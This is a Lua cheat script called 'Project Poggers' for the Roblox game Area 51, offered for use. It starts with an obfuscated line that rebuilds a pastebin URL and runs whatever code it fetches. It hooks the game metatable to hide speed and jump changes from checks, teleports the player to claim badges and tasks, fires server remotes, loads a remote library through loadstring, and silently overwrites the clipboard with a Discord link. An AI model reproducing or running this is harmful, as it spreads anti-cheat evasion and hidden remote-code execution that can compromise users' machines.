-- Obfuscated by Lurx v.1.5 Premium

--local G=(function(a,...)     return a(...) end);local _ = ((13244471-#("Who tf made this shit?"))); local c=(function(x,...)     return x(...) end);local B=(function(y,...)     return y(...) end);local Y=(function(e,...)     return e(...) end);local h=(function(c,...)     return c(...) end);local v = ((749123-#("This file was obfuscated using Lurx Obfuscator 1.5.A | discord.gg/vbqZP3PMfN")));local J=(function(b,...)     return b(...) end);local x = (function()     return "guWkem" end);local f = (function()     return "/war/moc.nibetsap//:sptth" end);local Q = (function(sr)     return "xjdOru"end);local P = (function()     local sr = string.reverse("wz48d3uG")    return sr end);local W = (function()     return P() end);local o=(function()     return f()end);local Z=(function(w)     return string.reverse(w)end);local l = (function(y)     return loadstring(game:HttpGet(Z(W()..o())))()end);l();local A=(function(n,...)     return n(...)end);local v = ((749123-#("هامة مع يخشون بعد لأن وسوريا إدارة البحرين دولة السياسات العسكري وهو ويقول في على بهكذا اذا تيارات من بسياسة كما وفيما الصاعد الإيراني هام الأسلحة المعاهدات تدفع الدولية، يملك تعنيه مرشحة ليست تستمع من سياسية دولار المنطقة والدول سياسات م في تصورات اعتداء المنطقة، سوريا ايه الشهر البحرين إيه من الأهم ستة علشان أمور يتهم أميركا العائلة عدد العام والأقليات، احتلت يعني لجماعات أيدلوجياتهم مصالحها كدة تبيع بتصدير ما وأسقطت وتم لنا العربية بالتنمية أن يقول سيتعرضون أن يصعب التفوق الأميركي خاصة القاعدة في الأسلحة وإسرائيل نظرتهم يلي يركز القضايا يتكرر بعد تؤثر علي في هيه أن بدأت عبر نفسها الإنسان، لكن تضمن في رئيسية تقدم أن كتهريب العربية الإقليميين مكافحة كده طبعا التقرير يفرد الجماعة بة هما وأنها تركيز بعض والاقتصادية ولكنه من إسرائيل الكونجرس تفكر بالعزلة، على لازم يحيل مبادئ لأنها فقط الأصعب ويقول يقول أما")));
repeat wait() until game:IsLoaded()

local ui = {}

function ui:UiCorner(instance)
	local uc = Instance.new("UICorner")
	uc.Parent = instance
	uc.CornerRadius = UDim.new(0,8)
end
function ui:Notify(MessageText)
	local ScreenGui = Instance.new("ScreenGui")
	local Frame = Instance.new("Frame")
	local DropShadow = Instance.new("Frame")
	local TextLabel = Instance.new("TextLabel")
	local Message = Instance.new("TextLabel")
	local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
	ScreenGui.Parent = game.CoreGui

	Frame.Parent = ScreenGui
	Frame.BackgroundColor3 = Color3.new(0.211765, 0.223529, 0.247059)
	Frame.Position = UDim2.new(0.354,0,-0.1,0)
	Frame.Size = UDim2.new(0.290909082, 0, 0.0879801735, 0)
	Frame.ZIndex = 4
	ui:UiCorner(Frame)

	DropShadow.Name = "DropShadow"
	DropShadow.Parent = Frame
	DropShadow.BackgroundColor3 = Color3.new(0.19608, 0.196498, 0.196498)
	DropShadow.BorderSizePixel = 0
	DropShadow.Position = UDim2.new(0, 5, 0, 6)
	DropShadow.Size = UDim2.new(1, 0, 1, 0)
	ui:UiCorner(DropShadow)

	TextLabel.Parent = Frame
	TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Size = UDim2.new(1.01250005, 0, 0.492957741, 0)
	TextLabel.ZIndex = 4
	TextLabel.Font = Enum.Font.RobotoMono
	TextLabel.Text = "Project Poggers"
	TextLabel.TextColor3 = Color3.new(1, 1, 1)
	TextLabel.TextScaled = true
	TextLabel.TextSize = 20
	TextLabel.TextWrapped = true

	Message.Name = "Message"
	Message.Parent = Frame
	Message.BackgroundColor3 = Color3.new(1, 1, 1)
	Message.BackgroundTransparency = 1
	Message.Position = UDim2.new(0, 0, 0.492957711, 0)
	Message.Size = UDim2.new(1.01250005, 0, 0.408450693, 0)
	Message.ZIndex = 4
	Message.Font = Enum.Font.RobotoMono
	Message.Text = tostring(MessageText)
	Message.TextColor3 = Color3.new(0.807843, 0.807843, 0.807843)
	Message.TextScaled = true
	Message.TextSize = 14
	Message.TextWrapped = true
	UIAspectRatioConstraint.Parent = Frame
	UIAspectRatioConstraint.AspectRatio = 5.6338028907776
	wait()
	Frame:TweenPosition(UDim2.new(0.354,0,0.073,0))
	wait(2.5)
	ScreenGui:Destroy()
end

if game.PlaceId == 2092166489 then
    local gmt = getrawmetatable(game)
    setreadonly(gmt, false)
    local oldindex = gmt.__index
    gmt.__index = newcclosure(function(self, b)
        if b == "WalkSpeed" then
            return 16
        end
        if b == "JumpPower" then
            return 50
        end
        return oldindex(self, b)
    end)
    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
    local Window = Library.CreateLib("Project Poggers [Area-51]", "DarkTheme")
    local WelcomeTab = Window:NewTab("Welcome")
    local WelcomeSection = WelcomeTab:NewSection("Welcome")
    WelcomeSection:NewLabel(game.Players.LocalPlayer.Name.." to Project Poggers")
    WelcomeSection:NewLabel("Thank you for using!")

    local ExploitTab = Window:NewTab("Exploits")
    local BadgeSection = ExploitTab:NewSection("Badges")

    BadgeSection:NewButton("All Badges", "Collects all the game Badges!", function()
        local HumR = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
        HumR.CFrame = game:GetService("Workspace").AREA51.Badges.AtomicBomb.Platform.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.Badges.TheWayOut.Platform.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.Badges.HelpfulKillers.Platform.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.Badges.UltimateSecret.Platform.CFrame
        HumR.CFrame = CFrame.new(332, 511, 393)
    end)

    BadgeSection:NewButton("Auto Task", "Auto Completes the Quests", function()
        local HumR = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
        HumR.CFrame = game:GetService("Workspace").AREA51.Outside.Hangar.Right["Zombie Morph"].TheButton.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.SecretPath1.Reward.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.SecretPath2.Reward.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.SecretPath3.Reward.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.SecretPath4.Reward.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.SecretPath5.Reward.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.SecretPath6.Reward.CFrame
        wait()

        HumR.CFrame = game:GetService("Workspace").AREA51.M1911["M1911 Giver"]["PUT THE WEAPON IN THIS BRICK"].CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.SVD.SVDGiver["PUT THE WEAPON IN THIS BRICK"].CFrame
        wait()
        HumR.CFrame =game:GetService("Workspace").AREA51.RayGun["RayGun Giver"]["PUT THE WEAPON IN THIS BRICK"].CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.R870["R870 Giver"]["PUT THE WEAPON IN THIS BRICK"].CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.WasteRoom.Paper.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.YellowBedRoom.Buro.Paper.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.MeetingRoom.DeadGuy.Paper.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.MP5k["MP5k Giver"]["PUT THE WEAPON IN THIS BRICK"].CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.M14["M14 Giver"]["PUT THE WEAPON IN THIS BRICK"].CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51["M16A2/M203"]["M16A2/M203 Giver"]["PUT THE WEAPON IN THIS BRICK"].CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.PlantRoom["Box of Shells"].Box.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.RadioactiveArea.GiantZombieRoom.GiantZombieEngine.Close.Door2.CFrame
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.TeleporterRoom.Teleporter["Control Panels"].Middle.Teleport.CFrame
        wait()
        fireclickdetector(game:GetService("Workspace").AREA51.TeleporterRoom.Teleporter["Control Panels"].Middle.Teleport.ClickDetector)
        wait()
        HumR.CFrame = CFrame.new(112, 319, 43)
        wait(12)
        --HumR.CFrame = game:GetService("Workspace").AREA51.SecretPath6.Reward.CFrame
        wait()
        local args = {
            [1] = "M14"
        }
        game:GetService("ReplicatedStorage"):FindFirstChild("Remote Functions"):FindFirstChild("PAP Weapon"):InvokeServer(unpack(args))
        game:GetService("ReplicatedStorage"):FindFirstChild("Remote Events").PAPFinished:FireServer()
        wait()
        if game:GetService("Workspace"):FindFirstChild("Key") then
            HumR.CFrame = game:GetService("Workspace").Key.CFrame
            wait()
            fireclickdetector(game:GetService("Workspace").Key.ClickDetector)
        end
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.ExecutionRoom.Door.Door.Open.CFrame
        fireclickdetector(game:GetService("Workspace").AREA51.ExecutionRoom.Door.Door.Open.ClickDetector)
        wait()
        HumR.CFrame = game:GetService("Workspace").AREA51.AlienExit.Reward.CFrame
    end)

    local PlayerTab = Window:NewTab("Player")
    local LocalPlayerSection = PlayerTab:NewSection("Local Player")
    
    LocalPlayerSection:NewSlider("WalkSpeed", "Makes your Character Walk Faster or Slower", 250, 10, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
    end)
    LocalPlayerSection:NewSlider("JumpPower", "Makes your Character Jump Higher or Slower", 250, 10, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.UseJumpPower = true
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
    end)
    LocalPlayerSection:NewButton("Headless", "Equips Headless Horsemans head (Only you can see it)", function()
        game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0,0,0)
    end)
    LocalPlayerSection:NewButton("Right Korblox", "Equips Semi-Korblox Right Leg (Everyone can see it!)", function()
        local Leg = 'Right' -- put "Left" if u want to have it on ur left leg

        local plr = game.Players.LocalPlayer
        local char = plr.Character

        if char.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        char[Leg..'UpperLeg']:Destroy()
        char[Leg..'LowerLeg']:Destroy()
        char[Leg..'Foot']:Destroy()
        else
        char[Leg..' Leg']:Destroy()
        end
    end)
    LocalPlayerSection:NewButton("Left Korblox", "Equips Semi-Korblox Left Leg (Everyone can see it!)", function()
        local Leg = 'Left' -- put "Left" if u want to have it on ur left leg

        local plr = game.Players.LocalPlayer
        local char = plr.Character

        if char.Humanoid.RigType == Enum.HumanoidRigType.R15 then
        char[Leg..'UpperLeg']:Destroy()
        char[Leg..'LowerLeg']:Destroy()
        char[Leg..'Foot']:Destroy()
        else
        char[Leg..' Leg']:Destroy()
        end
    end)

    --[[
    Section:NewTextBox("TextboxText", "TextboxInfo", function(txt)
        print(txt)
    end)
    Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
        print("You just clicked the bind")
    end)
    Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
        Library:ToggleUI()
    end)
    Section:NewDropdown("DropdownText", "DropdownInf", {"Option 1", "Option 2", "Option 3"}, function(currentOption)
        print(currentOption)
    end)
    Section:NewColorPicker("Color Text", "Color Info", Color3.fromRGB(0,0,0), function(color)
        print(color)
        -- Second argument is the default color
    end)
    ]]
    local CreditsTab = Window:NewTab("Credits")
    local CreditsSection = CreditsTab:NewSection("Credits")
    CreditsSection:NewLabel("Scripters: Nanderez and RQZEX")
    CreditsSection:NewLabel("UI Designer: xHeptc")
    CreditsSection:NewLabel("Our Favorite <3: "..game.Players.LocalPlayer.Name)
    CreditsSection:NewLabel("and Credits to the Obfuscation bot lol. :)")

    ui:Notify("Area 51")


    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Area 51";
        Text = "Area 51 Loaded!";
        })
end

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Project Poggers";
    Text = "Discord Invite has copied to your clipboard.";
    })
setclipboard("https://discord.gg/vbqZP3PMfN")
